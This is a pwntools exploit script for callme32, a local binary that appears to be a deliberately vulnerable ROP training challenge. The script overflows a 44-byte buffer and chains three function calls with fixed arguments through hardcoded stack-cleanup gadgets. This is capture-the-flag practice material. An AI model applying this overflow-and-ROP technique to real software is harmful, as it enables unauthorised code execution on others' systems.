#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./callme32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./callme32')
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'

io = start()

ARG0 = 0xdeadbeef
ARG1 = 0xcafebabe
ARG2 = 0xd00df00d
ARGS_COMBINED = p32(ARG0) + p32(ARG1) + p32(ARG2)

ADDESP8_POPEBX_RET = p32(0x80484aa) # add esp, 8; pop ebx; ret
ADDESP16_LEAVE_RET = p32(0x080485f2) # add esp, 0x10; leave; ret

# 44 bytes between start of buffer and saved eip
attack = b"A"*0x2c \
    + p32(exe.symbols["callme_one"]) + ADDESP8_POPEBX_RET + ARGS_COMBINED \
    + p32(exe.symbols["callme_two"]) + ADDESP8_POPEBX_RET + ARGS_COMBINED \
    + p32(exe.symbols["callme_three"]) + ADDESP8_POPEBX_RET + ARGS_COMBINED
io.sendline(attack)

io.interactive()
